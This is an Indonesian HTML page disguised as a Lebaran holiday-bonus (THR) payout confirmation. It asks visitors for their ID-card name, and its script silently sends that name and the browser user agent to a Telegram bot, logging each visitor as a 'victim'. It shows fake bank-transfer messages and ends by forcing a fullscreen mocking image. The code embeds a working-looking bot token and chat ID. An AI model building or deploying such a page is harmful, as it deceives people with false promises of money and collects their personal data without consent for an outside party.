<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Konfirmasi Penerimaan THR 2026 🌙</title>
    <style>
        body { margin: 0; padding: 0; background: #f0fdf4; font-family: 'Segoe UI', sans-serif; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; flex-direction: column; }
        #intro { margin-top: -50px; padding: 0 20px; }
        h1 { color: #15803d; margin-bottom: 5px; }
        p { color: #166534; margin-top: 0; }
        #verify-box { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); margin-bottom: 30px; width: 280px; }
        input { width: 90%; padding: 10px; border: 1px solid #ddd; border-radius: 8px; outline: none; text-align: center; font-size: 1rem; }
        #envelope { width: 280px; cursor: pointer; transition: all 0.2s ease; z-index: 10; margin-top: 20px; }
        #prank-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 100; justify-content: center; align-items: center; }
        #prank-screen img { width: 100%; height: 100%; object-fit: contain; }
        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 50; flex-direction: column; align-items: center; justify-content: center; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #15803d; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="intro">
        <h1>Selamat Lebaran! 🌙</h1>
        <p>Silakan verifikasi nama untuk pencairan THR.</p>
    </div>

    <div id="verify-box">
        <input type="text" id="victim-name" placeholder="Masukkan Nama Sesuai KTP" autocomplete="off">
    </div>

    <img id="envelope" src="amplop.png" alt="Amplop THR">

    <div id="loading-overlay">
        <div class="spinner"></div>
        <p id="status-text" style="margin-top: 15px; font-weight: bold; color: #15803d;">Menghubungkan ke server bank...</p>
    </div>

    <div id="prank-screen" onclick="location.reload()">
        <img src="monyet-memberikan-jari-tengah-kepada-orang-orang.jpg">
    </div>

    <script>
        const env = document.getElementById('envelope');
        const nameInput = document.getElementById('victim-name');
        const loading = document.getElementById('loading-overlay');
        const statusText = document.getElementById('status-text');
        const prank = document.getElementById('prank-screen');
        const prankSound = new Audio('https://www.myinstants.com/media/sounds/monkey-laugh.mp3');

        // DATA TELEGRAM LO SUDAH TERPASANG OTOMATIS
        const TELEGRAM_TOKEN = '8642591827:AAEW79QE8FGYcvELtapkI2jnhvXocW4rd9U'; 
        const TELEGRAM_CHAT_ID = '2128763567'; 

        function sendToTelegram(name) {
            const text = `🎯 KORBAN THR: ${name}\n📱 UserAgent: ${navigator.userAgent}`;
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}`)
            .catch(err => console.log("Gagal kirim log ke Tele lo"));
        }

        env.addEventListener('click', () => {
            const name = nameInput.value.trim();
            if (name === "") {
                alert("Masukkan nama dulu biar cair saldo THR-nya!");
                return;
            }

            // Kirim log diam-diam
            sendToTelegram(name);

            // Munculin loading biar ngarep
            loading.style.display = 'flex';
            setTimeout(() => { statusText.innerText = "Memverifikasi data " + name + "..."; }, 1000);
            setTimeout(() => { statusText.innerText = "Proses transfer saldo Rp 500.000..."; }, 2500);

            // JEDARRR! Monyet muncul
            setTimeout(() => {
                loading.style.display = 'none';
                prank.style.display = 'flex';
                prankSound.play();
                
                if (navigator.vibrate) navigator.vibrate([500, 100, 500]);
                
                // Maksa Fullscreen
                const elem = document.documentElement;
                if (elem.requestFullscreen) elem.requestFullscreen();
                else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
            }, 4500);
        });
    </script>
</body>
</html>
